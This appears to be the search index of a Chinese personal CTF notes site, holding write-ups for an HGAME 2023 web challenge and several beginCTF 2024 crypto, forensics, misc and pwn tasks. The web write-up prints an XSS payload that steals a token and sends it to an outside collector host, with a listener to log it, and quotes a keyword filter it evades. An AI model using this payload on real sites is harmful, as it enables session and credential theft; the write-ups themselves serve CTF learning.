{"config":{"lang":["en"],"separator":"[\\s\\u200b\\u3000\\-\u3001\u3002\uff0c\uff0e\uff1f\uff01\uff1b]+","pipeline":["stemmer"]},"docs":[{"location":"","title":"Home","text":"<ul> <li>\u672c\u9879\u76ee\u5b58\u653e\u6211\u7684\u7b14\u8bb0</li> </ul>"},{"location":"#_1","title":"\u5173\u4e8e\u6211","text":"\u5e73\u53f0 \u94fe\u63a5 github anjvW telegram @anjvanjvanjvanjvanjv"},{"location":"CTF/NSSCTF/%E5%88%B7%E9%A2%98/","title":"\u5237\u9898","text":""},{"location":"CTF/NSSCTF/%E5%88%B7%E9%A2%98/#hgame-2023-week2designer","title":"[HGAME 2023 week2]Designer","text":"<p>\u67e5\u770b\u4ee3\u7801,\u53ea\u6709\u672c\u5730\u767b\u5f55\u7684\u7528\u6237\u624d\u80fd\u5728JWT\u4e2d\u62e5\u6709flag</p>  button/share \u8def\u7531\u4ee3\u7801  JavaScript<pre><code>app.post(\"/button/share\", auth, async (req, res) =&gt; {\n    const browser = await puppeteer.launch({\n    headless: true,\n    executablePath: \"/usr/bin/chromium\",\n    args: ['--no-sandbox']\n    });\n    const page = await browser.newPage()\n    const query = querystring.encode(req.body)\n    await page.goto('http://127.0.0.1:9090/button/preview?' + query)\n    await page.evaluate(() =&gt; {\n    return localStorage.setItem(\"token\", \"jwt_token_here\")\n    })\n    await page.click(\"#button\")\n\n    res.json({ msg: \"admin will see it later\" })\n})\n</code></pre> <p>\u9898\u76ee\u7684 <code>/button/share</code> \u8def\u7531\u662f\u6253\u5f00\u6d4f\u89c8\u5668\u8bbf\u95ee http://127.0.0.1:9090/button/preview \u8fd9\u4e2a\u9875\u9762\u3002\u8fd9\u4e2a\u9875\u9762\u4e5f\u5728\u4ee3\u7801\u7684\u8def\u7531\u4e2d\uff0c</p>  button/preview \u8def\u7531\u4ee3\u7801  JavaScript<pre><code>app.get(\"/button/preview\", (req, res) =&gt; {\n  const blacklist = [\n    /on/i, /localStorage/i, /alert/, /fetch/, /XMLHttpRequest/, /window/, /location/, /document/\n  ]\n  for (const key in req.query) {\n    for (const item of blacklist) {\n      if (item.test(key.trim()) || item.test(req.query[key].trim())) {\n        req.query[key] = \"\"\n      }\n    }\n  }\n  res.render(\"preview\", { data: req.query })\n})\n</code></pre> <p>\u5e38\u89c1\u7684\u6ce8\u5165\u70b9\u90fd\u88ab\u8fc7\u6ee4\u4e86\uff0c\u6bd4\u5982onclick\u7b49\uff0c\u4e0d\u8fc7\u95ee\u9898\u4e0d\u5927\uff0c\u67e5\u9605preview.ejs\u4ee3\u7801\u5c31\u5f88\u5bb9\u6613\u53d1\u73b0\uff1a</p> HTML<pre><code>    &lt;a class=\"button\" id=\"button\" style=\"&lt;% for (const key in data) {  %&gt;&lt;%- key %&gt;:&lt;%- data[key] %&gt; ;&lt;% }; %&gt;\"&gt;\n    CLICK ME\n    &lt;/a&gt;\n</code></pre> <p>\u6309\u94ae\u662f\u901a\u8fc7\u5b57\u7b26\u4e32\u62fc\u63a5\u7684\u65b9\u5f0f\u8bbe\u7f6estyle\u7684\uff0c\u56e0\u6b64\uff0c\u53ea\u9700\u8981\u6709\u4e00\u4e2a\"\u5c31\u80fd\u5c06HTML\u8bed\u53e5\u622a\u65ad\uff0c\u7531\u4e8e\u811a\u672c\u4e2d\u4e0d\u80fd\u51fa\u73b0window\u7b49\u8bcd\u8bed\uff0c\u56e0\u6b64\uff0c\u53ef\u4ee5\u8003\u8651\u4f7f\u7528atob\u51fd\u6570\u89e3\u7801\u5b57\u7b26\u4e32\u540e\uff0c\u4f7f\u7528eval\u51fd\u6570\u6267\u884c\u8bed\u53e5\uff0c\u6784\u9020\u7684js\u811a\u672c\u9700\u8981\u80fd\u83b7\u53d6localStorage\u4e2d\u7684\u5185\u5bb9\uff0c\u5e76\u4e0a\u4f20\u5230\u63a5\u6536\u4fe1\u606f\u7684\u670d\u52a1\u5668\u3002\u4ee5\u4e0b\u662f\u6211\u6784\u9020\u7684\u811a\u672c\uff1a</p>  xss\u811a\u672c  JavaScript<pre><code>async function r() {\n    var a = new XMLHttpRequest();\n    var b = new FormData();\n    fetch('http://127.0.0.1:9090/user/register', {\n        method: 'POST',\n        body: { \"username\": \"admin\" }\n    })\n        .then(response =&gt; response.text())\n        .then(data =&gt; {\n            b.append('token', data);\n            a.open('POST', \"http://ctf.xxx.cn:65502/a/stat.gif\");\n            a.send(b)\n        })\n}\nr();\n// \u4ee3\u7801\u53ef\u80fd\u6709\u70b9\u4e71\uff0c\u6211\u6839\u636e\u53c2\u8003\u7684writeup\u5199\u7684\uff0cfetch\u90e8\u5206\u662fgpt\u751f\u6210\u7684\n</code></pre> <p>\u5c06\u4e0a\u811a\u672cbase64\u7f16\u7801\uff0c\u7136\u540ePOST\u8bf7\u6c42/button/share \u63a5\u53e3\uff0c\u8bf7\u6c42\u5185\u5bb9\u4e3a\uff1a JSON<pre><code>    {\"border-radius\":\"\\\"&gt;&lt;script&gt;eval(atob('BASE64\u7f16\u7801\u5185\u5bb9'))&lt;/script&gt;\"}\n</code></pre></p> <p>VPS\u4e2d\u8fd0\u884c\u4e00\u4e2aflask\u670d\u52a1\uff0c\u63a5\u6536\u8bf7\u6c42</p>  flask\u670d\u52a1\u4ee3\u7801  Python<pre><code>from flask import Flask,request\n\napp = Flask(__name__)\n\n@app.route('/', defaults={'path': ''})\n@app.route('/&lt;path:path&gt;', methods=['POST','GET'])\ndef catch_all(path):\n    app.logger.info(request.get_data())\n    return 'yes'\nif __name__ == '__main__':\n    app.run(debug=True,port=65502,host='0.0.0.0')\n</code></pre> <p>\u5728vps\u4e2d\u7b49\u7740\u65e5\u5fd7\u5c31\u884c  \u6700\u540e\u5c06\u65e5\u5fd7\u4e2d\u83b7\u5f97\u7684jwt\u89e3\u7801\u4e00\u4e0b\uff0c\u5c31\u83b7\u5f97flag</p> <p>\u53c2\u8003 vvbbnn00\u5e08\u5085\u7684writeup</p>"},{"location":"CTF/beginCTF/beginctf2024/","title":"Beginctf2024","text":"<p>\u5176\u4ed6\u5e08\u5085\u7684writeup</p> <ul> <li>https://www.nssctf.cn/note/set/5422</li> <li>https://starrysky1004.github.io/2024/02/09/2024beginctf-pwn/2024beginctf-pwn/</li> </ul>"},{"location":"CTF/beginCTF/beginctf2024/#crypto","title":"crypto","text":""},{"location":"CTF/beginCTF/beginctf2024/#fake_n","title":"fake_n","text":""},{"location":"CTF/beginCTF/beginctf2024/#_1","title":"\u9898\u76ee","text":"Python<pre><code>from Crypto.Util.number import *\nfrom secret import flag\n\ndef fakeN_list():\n    puzzle_list = []\n\n    for i in range(15):\n        r = getPrime(32)\n        puzzle_list.append(r)\n\n    p = getPrime(32)\n    q = getPrime(32)\n    com = p*q\n\n    puzzle_list.append(com)\n\n    return puzzle_list\n\ndef encrypt(m,e,fake_n_list):\n\n    fake_n = 1\n    for i in range(len(fake_n_list)):\n        fake_n *= fake_n_list[i]\n\n    really_n = 1\n    for i in range(len(fake_n_list)-1):\n        really_n *= fake_n_list[i]\n\n    c = pow(m,e,really_n)\n\n    print(\"c =\",c)\n    print(\"fake_n =\",fake_n)\n\nif __name__ == '__main__':\n    m = bytes_to_long(flag)\n    e = 65537\n    fake_n_list = fakeN_list()\n    encrypt(m,e,fake_n_list)\n\n'''\nc = 6451324417011540096371899193595274967584961629958072589442231753539333785715373417620914700292158431998640787575661170945478654203892533418902\nfake_n = 178981104694777551556050210788105224912858808489844293395656882292972328450647023459180992923023126555636398409062602947287270007964052060975137318172446309766581\n'''\n</code></pre>"},{"location":"CTF/beginCTF/beginctf2024/#_2","title":"\u89e3\u9898\u8fc7\u7a0b","text":"<p>\u5206\u6790\u9898\u76ee\uff0c\u53ef\u77e5\uff0cfake_n\u662f17\u4e2a32\u4f4d\u7684\u8d28\u6570\u7684\u79ef</p> <p>\u771f\u5b9e\u7684n\u662f\u5176\u4e2d15\u4e2a\u8d28\u6570</p> <p>\u5206\u89e3fake_n\uff0c\u5f97\u523017\u4e2a\u6570 [2215221821, 2290486867, 2333428577, 2361589081, 2446301969, 2507934301, 2590663067, 3107210929, 3278987191, 3389689241, 3417707929, 3429664037, 3716624207, 3859354699, 3965529989, 4098704749, 4267348123]</p> <p>\u4f7f\u7528itertools\u7684combinations\u7ec4\u5408\uff0c\u53d615\u4e2a\u4e3a\u4e00\u7ec4\u4e3an\uff0c\u89e3\u5bc6</p>"},{"location":"CTF/beginCTF/beginctf2024/#exp","title":"exp","text":"Python<pre><code>import gmpy2,libnum\nfrom itertools import combinations\n\nnn = [2215221821, 2290486867, 2333428577, 2361589081, 2446301969, 2507934301, 2590663067, 3107210929, 3278987191, 3389689241, 3417707929, 3429664037, 3716624207, 3859354699, 3965529989, 4098704749, 4267348123]\ne = 65537\nc = 6451324417011540096371899193595274967584961629958072589442231753539333785715373417620914700292158431998640787575661170945478654203892533418902\n\n# \u751f\u6210\u6240\u6709\u53ef\u80fd\u7684\u7ec4\u5408\nall_combinations = []\nfor r in range(1, len(nn) + 1):\n    all_combinations.extend(combinations(nn, r))\n\nfor combination in all_combinations:\n    ni = list(combination)[:-2]\n    n = 1\n    phi = 1\n    for i in ni:\n        n*=i\n        phi*=(i-1)\n    d = gmpy2.invert(e,phi)\n    m = pow(c,d,n)\n    m_s = libnum.n2s(int(m))\n    if \"begin{\" in  str(m_s):\n        print(m_s)\n        exit()\n</code></pre>"},{"location":"CTF/beginCTF/beginctf2024/#forensics","title":"Forensics","text":""},{"location":"CTF/beginCTF/beginctf2024/#reverse","title":"\u9006\u5411\u5de5\u7a0b(reverse)\u5165\u95e8\u6307\u5357","text":""},{"location":"CTF/beginCTF/beginctf2024/#_3","title":"\u89e3\u9898\u8fc7\u7a0b","text":"<p>\u9898\u76ee\u662f\u4e00\u4e2apdf\uff0c\u662f\u9006\u5411\u5de5\u7a0b(reverse)\u5165\u95e8\u6307\u5357</p> <p>\u6d4f\u89c8\u5668\u6253\u5f00\uff0cctrl+a \u9009\u4e2d\u4e00\u6bb5\u900f\u660e\u5b57\u7b26\uff0cctrl+c\u590d\u5236\uff0c\u7c98\u8d34\uff0c\u83b7\u5f97flag</p> <p>\u6307\u5357\u5f88\u597d\uff0c\u770b\u4e86\u4f1a\u513f\u3002\u770b\u5b8c\u62ffflag\uff0c\u5230\u5e73\u53f0\u770b\uff0c\u5df2\u7ecf\u6709\u4e8c\u4e09\u5341\u4e2a\u961f\u4f0d\u63d0\u4ea4\u4e86flag\ud83d\ude2d</p>"},{"location":"CTF/beginCTF/beginctf2024/#beginner_forensics","title":"beginner_Forensics!!!!","text":"<p>\u5bf9\u4e8e\u53d6\u8bc1\u521d\u5b66\u8005\u6765\u8bf4,\u4ed6\u4eec\u6216\u8bb8\u4f1a\u9047\u5230\u4e00\u4e9b\u6df7\u6dc6\u7684\u4ee3\u7801.\u800c\u4f60\u9700\u8981\u5b66\u4f1a\u5982\u4f55\u53bb\u89e3\u51b3\u4ed6\u4eec?\u8bf7\u53d1\u6325\u4f60\u7684\u60f3\u6cd5,\u62ff\u5230\u9690\u85cf\u4e8e\u5176\u7684\u79d8\u5bc6! \ud83e\udd87</p>"},{"location":"CTF/beginCTF/beginctf2024/#_4","title":"\u89e3\u9898\u8fc7\u7a0b","text":"<p>\u9898\u76ee\u6587\u672c\u5f62\u5f0f\u6253\u5f00 \u53d1\u73b0\u5b57\u7b26\u4e32\u201c::BatchEncryption Build 201610 By gwsbhqt@163.com\u201d \u641c\u7d22\uff0c\u53d1\u73b0\u5f3a\u56fd\u676f2022\u7684\u4e00\u4e2a\u9898\u76ee\uff0c \u6839\u636ewriteup\uff0c\u77e5\u9053\u8fd9\u662f\u52a0\u5bc6\u65b9\u5f0f\u4e3abatchencryption\u7684bat\u811a\u672c\uff0c \u4f7f\u7528\u811a\u672c\u89e3\u5bc6 Python<pre><code>#!/usr/bin/python\n# -*- coding: UTF-8 -*-\nimport os\nimport sys\nenvars = dict()\n\ndef readVarvalue(data):\n    length = len(data)\n    source = str(data, encoding=\"utf-8\")\n    buffer = source[1:length - 1]\n    buffer = buffer.split(\":~\")\n\n    varname = buffer[0]\n    if not varname in envars:\n        envars[varname] = os.getenv(varname)\n\n    entity = envars[varname]\n    if not entity:  # None value\n        return source\n\n    length = len(buffer)\n    if length &gt; 1:\n        length = len(entity)\n        buffer = buffer[1].split(\",\")\n        start = int(buffer[0])\n        ended = int(buffer[1])\n        if start &lt; 0:\n            start, ended = length + start, ended\n        source = entity[start: start + ended]\n    return source\n\n\ndef batchReader(data, index, length):\n    buffer = bytes(); source = str()\n\n    flag = False; start = 0; ended = 0\n    while(True):\n        if data[index] in [0xFF, 0xFE]: index += 1; continue\n        if data[index] == 0x0D and data[index + 1] == 0x0A: index += 2; break\n        if data[index] == 0x25: # \u5224\u65ad\u53d8\u91cf\u7b26\u53f7, \u83b7\u53d6\u7b26\u53f7\u540d\n            if not flag:\n                flag = True\n                start = index\n            else:\n                flag = False\n                ended = index + 1\n                buffer = data[start:ended]\n                source += readVarvalue(buffer)\n            index += 1\n        else:\n            if not flag: # \u4fdd\u5b58\u5176\u4ed6\u5b57\u7b26\u4e32\n                try:\n                    buffer = data[index:index + 1]\n                    source += str(buffer, encoding=\"utf-8\")\n                    index += 1\n                except Exception as err:\n                    ansiByte = bytes(); ansiLen = index\n                    while (str(buffer).find(\"x\") &gt;= 0):\n                        ansiByte += buffer; ansiLen += 1\n                        buffer = data[ansiLen:ansiLen + 1]\n                    source += ansiByte.decode(\"ansi\", \"ignore\")\n                    index = ansiLen\n            else: # \u4fdd\u5b58\u53d8\u91cf\u5185\u7684\u540d\u79f0\n                if (start + 1 == index) and ((data[index] &gt;= 0x30 and data[index] &lt;= 0x39) or data[index] == 0x2A):\n                    flag = False\n                    ended = index\n                    buffer = data[start: ended + 1]\n                    source += str(buffer, encoding=\"utf-8\")\n                index += 1\n        if index &gt;= length: break\n    print(source)\n    bufs = source.split('&amp;@') # \u89e3\u6790\u52a0\u5bc6\u53d8\u91cf\n    for var in bufs:\n        if var[0:4] == 'set ':\n            var = var[4:]\n            b = var.find('=')\n            envars[var[0:b]] = var[b+1:].replace('^^^', '^')\n    source += '\\r\\n'\n    return {\"index\": index, \"source\": source}\n\n\ndef batchDecryp(data):\n    result = dict(); source = str()\n\n    index = 0; length = len(data)\n    while (index &lt; length):\n        result = batchReader(data, index, length)\n        index = result.get(\"index\")\n        source = result.get(\"source\")\n    return source\n\n\nif __name__ == '__main__':\n    # if len(sys.argv) &lt; 2:\n    #     print(\"[x] Script parameter length error!\")\n    #     print(\"[!] Usage: python dencrypt.py encrypt.bat\")\n    #     exit(0)\n    file = open('forensics.bat', \"rb\")\n    data = file.read(); file.close()\n    batchDecryp(data)\n    exit(0)\n</code></pre> \u8fd0\u884c\u5f97\u5230bat\u811a\u672c Batchfile<pre><code>@echo on&amp;@endlocal&amp;@cls\n@echo off\necho catf1y:your flag is already deleted by me.\nset find_me_pls = b@TcH_O8FU$c@T1on_15_e@SY_70_SO1vE\necho crazyman:no no no no no no !!!!! i need flag.\necho Attention:can you help crazyman to find the flag?\necho Attention:Submit the info you are looking for on begin{*}\n</code></pre></p> <p>flag:  <code>begin{b@TcH_O8FU$c@T1on_15_e@SY_70_SO1vE}</code></p> <p>\u53c2\u8003https://www.cnblogs.com/sakura--tears/p/17148303.html#B%40tCh \u5982\u679c\u6ca1\u6709\u201c::BatchEncryption Build 201610 By gwsbhqt@163.com\u201d \u6211\u90fd\u4e0d\u77e5\u9053\u4ece\u4f55\u4e0b\u624b\uff0c\ud83d\ude2d</p>"},{"location":"CTF/beginCTF/beginctf2024/#misc","title":"misc","text":""},{"location":"CTF/beginCTF/beginctf2024/#10","title":"\u4f60\u77e5\u9053\u4e2d\u56fd\u6587\u5316\u561b1.0","text":"<p>\u4e2d\u56fd\u6587\u5316\u535a\u5927\u7cbe\u6df1\uff0c</p>"},{"location":"CTF/beginCTF/beginctf2024/#_5","title":"\u89e3\u9898\u8fc7\u7a0b","text":"<p>\u6253\u5f00\u9644\u4ef6\uff0c \u5f97\u5230\u4e00\u5806\u5b57\u7b26\uff0c\u662fbase\u7f16\u7801</p> Text Only<pre><codeamp;CTCZOFGFV4KMLFYUYWPRJRNHCTC36FGFS4KMLFYUYWTRJRMXCTC3OFGFR4KMLHYUYWTRJRNPCTCZOFGFS4KMLFYUYWLRJRMPCTC2OFGFT4KMLLYUYWDRJRMXCTC3OFGFQ4KMLFYUYWLRJRMHCTCZ6FGFU4KMLPYUYWLRJRMPCTCYOFGFS4KMLNYUYWHRJRM7CTC2OFGFV4KMLFYUYWPRJRM7CTCZOFGFX4KMLLYUYWPRJRNHCTC26FGFS4KMLFYUYWLRJRMXCTCY6FGFU4KMLHYUYWXRJRMHCTCZOFGFW4KMLBYUYWLRJRMXCTCYOFGFT4KMLJYUYWXRJRMXCTC26FGFX4KMLFYUYWHRJRNHCTCZ6FGFU4KMLLYUYWLRJRN&ampn</code></pre> <p>\u4e0d\u662f\u5e38\u89c1\u7684base64\uff0c\u662fbase32 \u89e3\u7801base32\u51fa\u9519\uff0c\u6709\u5b57\u7b26\u88ab\u66ff\u6362\u4e3a\u7279\u6b8a\u5b57\u7b26@$&amp;</p> <p>\u590d\u5236\u524d\u9762\u7684\u5b57\u7b26\u8fdb\u884cbase32\u89e3\u7801\uff0c\u662f\u516b\u5366\u5b57\u7b26\u52a0\u5bc6</p> <p>\ud83d\udca1\u7f16\u5199python\u5c06\u7279\u6b8a\u5b57\u7b26\u66ff\u6362\u4e00\u4e0b\uff0c\u89e3\u7801base32\uff0c\u5e76\u89e3\u5bc6\u516b\u5366\u5b57\u7b26</p>"},{"location":"CTF/beginCTF/beginctf2024/#_6","title":"\u89e3\u9898\u811a\u672c","text":"Python<pre><code>import subprocess\n#####\u516b\u5366\u5b57\u7b26\u89e3\u5bc6\u51fd\u6570-\u5f00\u59cb####\ndef bArrToStr(bArr):\n    nByte = b''\n    for b in bArr:\n        nByte += chr(int(b,base=8)).encode('raw_unicode_escape')\n    return bytes.decode(nByte)\ndef to8bArr(baguaStr):\n    code = {'\u2630':'0',  # \u4e7e\n            '\u2631':'1',  # \u5151\n            '\u2632':'2',  # \u79bb\n            '\u2633':'3',  # \u9707\n            '\u2634':'4',  # \u5dfd\n            '\u2635':'5',  # \u574e\n            '\u2636':'6',  # \u826e\n            '\u2637':'7',  # \u5764\n            }\n    bArr = []\n    temp = []\n    # \u628a\u516b\u5366\u7b26\u8f6c\u4e3a8\u8fdb\u5236\u6570\u5b57\n    for s in baguaStr:\n        temp.append(code[s])\n    tempStr = ''\n    # \u6570\u5b573\u4e2a\u4e00\u7ec4 \u7ec4\u5408\u56de\u516b\u8fdb\u5236\n    for i in range(len(temp)):\n\n        tempStr += temp[i]\n\n        if i % 3 == 2:\n            bArr.append('0o'+tempStr)\n            tempStr = ''\n    return bArr\ndef base8bagua(m):\n    arr = to8bArr(m)\n    return  bArrToStr(arr)\n#####\u516b\u5366\u5b57\u7b26\u89e3\u5bc6\u51fd\u6570-\u7ed3\u675f####\n\n# \u6240\u6709\u51fa\u73b0\u7684\u80fd\u8bc6\u522b\u7684\u5b57\u7b26\nzimu = \"FYRCMLTUJWK4GOXNHZP62S73VDBQ\"\n# \u4f9d\u6b21\u66ff\u6362@$&amp;\u4e3a\u53ef\u80fd\u51fa\u73b0\u7684\u5b57\u7b26\nwith open(\"a.txt\") as f:\n    txt = f.read()[:-1]\n    for i in zimu:\n        itxt = txt.replace('@',i)\n        for j in zimu:\n            jtxt = itxt.replace(\"&amp;\",j)\n            for k in zimu:\n                ktxt = jtxt.replace('$',k)\n                # \u51fa\u9519\u5c31\u4e0b\u4e00\u4e2a\n                try:\n                    # \u6211\u5199\u5230base32 \u4e00\u76f4\u6709\u95ee\u9898\uff0c\u5c31\u76f4\u63a5\u8c03\u7528shell\u4e86\n                    result = subprocess.run(f\"echo '{ktxt}' | base32 -d\", shell=True, capture_output=True, text=True)\n                    # \u8f93\u51fa\u7ed3\u679c\n                    osres = result.stdout\n                    print(base8bagua(osres))\n                except:\n                    continue\n</code></pre> <p>\u811a\u672c\u8dd1\u4e86\u597d\u51e0\u5206\u949f\uff0c\u5e94\u8be5\u8fd8\u80fd\u4f18\u5316\uff0c\u4f46\u662f\u9898\u89e3\u51fa\u6765\u4e86\uff0c\u5c31\u4e0d\u7ba1\u4e86\ud83d\ude04</p> <p>\u8fd0\u884c\u7ed3\u679c\u67094\u4e2a\uff0c\u4e00\u773c\u770b\u51fa\u662f\u6838\u5fc3\u4ef7\u503c\u89c2\u7f16\u7801\uff0c\u4e00\u4e2a\u4e00\u4e2a\u89e3\u5bc6\uff08\u5c31\u4e0d\u5199\u811a\u672c\u6838\u5fc3\u4ef7\u503c\u89c2\u89e3\u5bc6\u811a\u672c\u4e86\ud83d\udc36\uff09</p> <p>\u516c\u6b63\u6587\u660e\u516c\u6b63\u548c\u8c10\u516c\u6b63\u5e73\u7b49\u6587\u660e\u53cb\u5584\u6cd5\u6cbb\u548c\u8c10\u6cd5\u6cbb\u516c\u6b63\u6587\u660e\u516c\u6b63\u5e73\u7b49\u516c\u6b63\u5e73\u7b49\u548c\u8c10\u7231\u56fd\u516c\u6b63\u5e73\u7b49\u548c\u8c10\u548c\u8c10\u516c\u6b63\u81ea\u7531\u548c\u8c10\u7231\u56fd\u548c\u8c10\u5bcc\u5f3a\u548c\u8c10\u7231\u56fd\u516c\u6b63\u516c\u6b63\u516c\u6b63\u548c\u8c10\u516c\u6b63\u6cd5\u6cbb\u516c\u6b63\u5e73\u7b49\u516c\u6b63\u81ea\u7531\u6587\u660e\u8bda\u4fe1\u548c\u8c10\u548c\u8c10\u6587\u660e\u516c\u6b63\u5e73\u7b49\u516c\u6b63\u516c\u6b63\u548c\u8c10\u656c\u4e1a\u548c\u8c10\u81ea\u7531\u516c\u6b63\u516c\u6b63\u6cd5\u6cbb\u53cb\u5584\u6cd5\u6cbb\u516c\u6b63\u656c\u4e1a\u6cd5\u6cbb\u53cb\u5584\u5e73\u7b49\u516c\u6b63\u6c11\u4e3b\u548c\u8c10\u6cd5\u6cbb\u6587\u660e\u8bda\u4fe1\u548c\u8c10\u548c\u8c10\u6c11\u4e3b\u548c\u8c10\u7231\u56fd\u6587\u660e\u8bda\u4fe1\u548c\u8c10\u548c\u8c10\u6c11\u4e3b\u548c\u8c10\u6587\u660e\u516c\u6b63\u53cb\u5584\u7231\u56fd\u548c\u8c10\u7231\u56fd\u548c\u8c10\u6c11\u4e3b\u516c\u6b63\u548c\u8c10\u516c\u6b63\u5e73\u7b49</p> <p>\u89e3\u51fa: bce-7bee8e3d808fcged-2ef94f}i{a7-18-12n81ce</p> <p>\u79fb\u4f4d\u4e00\u4e0b</p> <p>begin{eec8da87-ee32-11ed-8f8c-907841e2ffbc}</p> <p>\u811a\u672c\u5199\u4e86\u4e00\u4e24\u4e2a\u5c0f\u65f6\ud83d\ude2d</p>"},{"location":"CTF/beginCTF/beginctf2024/#real-check-in","title":"real check in","text":"<p>\u4e3a\u4e86\u9009\u624b\u6709\u66f4\u597d\u7684\u6e38\u73a9\u4f53\u9a8c\u8bf7\u53ca\u65f6\u52a0\u5165beginctf2024\u5b98\u65b9\u7fa4,\u7fa4\u53f7:612995005</p> <p>\u4ececatf1y\u7684\u7b14\u8bb0\u672c\u4e2d\u53d1\u73b0\u4e86\u8fd9\u4e2a\u795e\u79d8\u7684\u4ee3\u7801MJSWO2LOPNLUKTCDJ5GWKX3UN5PUEM2HNFXEGVCGL4ZDAMRUL5EDAUDFL5MU6VK7O5UUYMK7GEYWWZK7NE3X2===</p> <p>\u4f60\u80fd\u5e2e\u52a9\u6211\u627e\u5230\u6700\u540e\u7684flag\u5417?</p>"},{"location":"CTF/beginCTF/beginctf2024/#_7","title":"\u89e3\u9898\u8fc7\u7a0b","text":"<p>\u7b7e\u5230\u9898\uff0ccyber\u9b54\u672f\u68d2\u4e00\u952e\u89e3\u51fa   base32\u89e3\u7801 </p>"},{"location":"CTF/beginCTF/beginctf2024/#tupper","title":"Tupper","text":"<p>\u5e74\u8f7b\u4eba\u4eec\u7b2c\u4e00\u9053misc\u7b7e\u5230\u9898</p> <p>\u524d\u4e00\u5929\u6ca1\u6709\u4efb\u4f55\u601d\u8def\uff0c\u76f4\u5230\u770b\u5230\u505a\u51fa\u7684\u4eba\u8d8a\u6765\u8d8a\u591a\uff0c\u5e94\u8be5\u662f\u7b80\u5355\u7684\u9898\u76ee\uff0c\u4e5f\u6ca1\u6709\u770b\u5230\u5565\u63d0\u793a\uff0c\u76f4\u5230\u6211\u641c\u7d22\u9898\u76ee\u540d\uff0c\u53d1\u73b0\u9898\u76ee\u540d\u5c31\u662f\u63d0\u793a\ud83d\ude22</p>"},{"location":"CTF/beginCTF/beginctf2024/#_8","title":"\u89e3\u9898\u8fc7\u7a0b","text":"<p>\u89e3\u538b\u9644\u4ef6\uff0c\u83b7\u5f97\u5f88\u591atxt\uff0c\u6587\u4ef6\u540d\u4e3a \u6570\u5b57.txt \u6253\u5f00\u4e00\u4e2atxt\u3002\u5e94\u8be5\u662f\u662fbase\uff0c</p> <p>\u6309\u6587\u4ef6\u540d\u6392\u5e8f\u6253\u5f00\u6240\u6709\u6587\u4ef6</p> Text Only<pre><code>cat $(ls -v *.txt) \n\nMTQyNzgxOTM0MzI3MjgwMjYwNDkyOTg1NzQ1NzU1NTc1MzQzMjEwNjIzNDkzNTI1NDM1NjI2NTY3NjY0Njk3MDQwOTI4NzQ2ODgzNTQ2NzkzNzEyMTI0NDQzODIyOTg4MjEzNDIwOTM0NTAzOTg5MDcwOTY5NzYwMDI0NTg4MDc1OTg1MzU3MzUxNzIxMjY2NTc1MDQxMzExNzE2ODQ5MDcxNzMwODY2NTk1MDUxNDM5MjAzMDAwODU4MDg4MDk2NDcyNTY3OTAzODQzNzg1NTM3ODAyODI4OTQyMzk3NTE4OTg2MjAwNDExNDMzODMzMTcwNjQ3MjcxMzY5MDM2MzQ3NzA5MzYzOTg1MTg1NDc5MDA1MTI1NDg0MTk0ODYzNjQ5MTUzOTkyNTM5NDEyNDU5MTEyMDUyNjI0OTM1OTExNTg0OTc3MDgyMTkxMjY0NTM1ODc0NTY2MzczMDI4ODg3MDEzMDMzODIyMTA3NDg2Mjk4MDAwODE4MjE2ODQyODMxODczNjg1NDM2MDE1NTk3Nzg0MzE3MzUwMDY3OTQ3NjE1NDI0MTMwMDY2MjEyMTkyMDczMjI4MDg0NDkyMzIwNTA1Nzg4NTI0MzEzNjE2Nzg3NDUzNTU3NzY5MjExMzIzNTI0MTk5MzE5MDc4MzgyMDUwMDExODQ=\n</code></pre> <p>\u89e3\u7801base64\uff0c\u83b7\u5f97\u4e00\u4e32\u6570\u5b57</p> Text Only<pre><code>cat $(ls -v *.txt) | base64 -d\n\n14278193432728026049298574575557534321062349352543562656766469704092874688354679371212444382298821342093450398907096976002458807598535735172126657504131171684907173086659505143920300085808809647256790384378553780282894239751898620041143383317064727136903634770936398518547900512548419486364915399253941245911205262493591158497708219126453587456637302888701303382210748629800081821684283187368543601559778431735006794761542413006621219207322808449232050578852431361678745355776921132352419931907838205001184\n</code></pre> <p>\u8d77\u521d\u4ee5\u4e3a\u662f\u8f6c\u5b57\u7b26\u4e32\uff0c\u8f6c\u597d\u4e45\uff0c\u5931\u8d25\u3002</p> <p>\u6309\u63d0\u793a\u641c\u7d22tupper</p> <p>\u4f7f\u7528 \u5728\u7ebf\u89e3\u5bc6\u7f51\u7ad9https://tuppers-formula.ovh/</p> <p>\u83b7\u5f97flag</p> <p></p>"},{"location":"CTF/beginCTF/beginctf2024/#where-is-crazyman-v10","title":"where is crazyman v1.0","text":"<p>\u4f60\u80fd\u627e\u5230\u7a7a\u767d\u5728\u54ea\u91cc\u5417? \u53ea\u9700\u8981\u63d0\u4f9b\u5730\u6bb5\u540d\u79f0\u5373\u53ef. \u53ef\u63a5\u53d7\u7684\u683c\u5f0f\u6709\u4e24\u79cdbegin{{\u4e09\u4f4d\u7b80\u4f53\u4e2d\u6587}}\u6216\u8005begin{{9\u4f4d\u82f1\u6587\u5b57\u6bcd\u7b2c\u4e00\u4e2a\u9700\u8981\u5927\u5199}} \u4f8b\u5982:begin{\u4e8c\u4e03\u5e7f\u573a} \u6216\u8005 begin{Erqisquare}</p>"},{"location":"CTF/beginCTF/beginctf2024/#_9","title":"\u9898\u76ee\u9644\u4ef6","text":""},{"location":"CTF/beginCTF/beginctf2024/#_10","title":"\u89e3\u9898\u8fc7\u7a0b","text":"<p>google\u641c\u56fe  \u83b7\u5f97\u5730\u540d  \u79cb\u53f6\u539f</p> <p>flag\u4e3a\uff1a  begin{\u79cb\u53f6\u539f}</p>"},{"location":"CTF/beginCTF/beginctf2024/#pwn","title":"PWN","text":""},{"location":"CTF/beginCTF/beginctf2024/#ezpwn","title":"ezpwn","text":""},{"location":"CTF/beginCTF/beginctf2024/#_11","title":"\u9898\u76ee","text":"<p>\u9898\u76ee\u4e0b\u8f7d</p>"},{"location":"CTF/beginCTF/beginctf2024/#_12","title":"\u89e3\u9898\u8fc7\u7a0b","text":"<p>checksec\u770b\u4e86\u4e00\u4e0b\uff0c\u770b\u4e0d\u61c2\uff0c(\u5927\u4f6c\u4eec\u505apwn\u90fd\u662f\u770b\u7684\u2705) Text Only<pre><code>    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n</code></pre> \u76f4\u63a5ida64\u6253\u5f00</p> <p>\u5927\u6982\u903b\u8f91\u662f\u6709\u4e2a\u83dc\u5355 4\u4e2a\u9009\u9879 C<pre><code>  puts(\"1.Test your data\");\n  puts(\"2.Test your command\");\n  